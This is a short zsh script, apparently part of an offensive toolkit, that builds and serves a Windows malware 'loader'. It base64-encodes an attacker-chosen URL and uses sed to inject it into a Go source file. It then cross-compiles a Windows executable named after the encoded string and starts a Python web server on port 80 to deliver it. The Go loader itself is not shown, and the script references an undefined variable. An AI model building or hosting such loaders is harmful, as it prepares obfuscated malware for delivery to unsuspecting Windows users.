#!/bin/zsh

# Check if exactly 2 args are provided
if [ "$#" -ne 2 ]; then
    echo "[i] Usage: $0 <new_url> <file_name>"
    echo "[i] Subdirs for webserver not supported"
    echo "[i] e.g: ./builder.sh http://192.168.0.5 main.go"
    exit 1
fi

# Not elegant but will do for now
echo $1 > URL
base64 URL > base64URL
base64Address=$(cat base64URL)
rm URL;rm base64URL

echo "[i] Supplied URL: $1"
#I can hard code to write to main.go but decided to do this anw
echo "[i] File to write URL to: $2"
echo "[i] $base64Address"

# Checks if file exists
if [ ! -f "$2" ]; then
    echo "[-]File $file_name not found!"
    exit 1
fi

# Replace the line with url with arg1
sed -i "/url := /c\url := \"$base64Address\"" "$2"

export GOOS=windows
export GOARCH=amd64
go build -o $base64Address.exe
echo "[+] The loader is ready !"
echo "[i] Launching http server ..."
python3 -m http.server 80
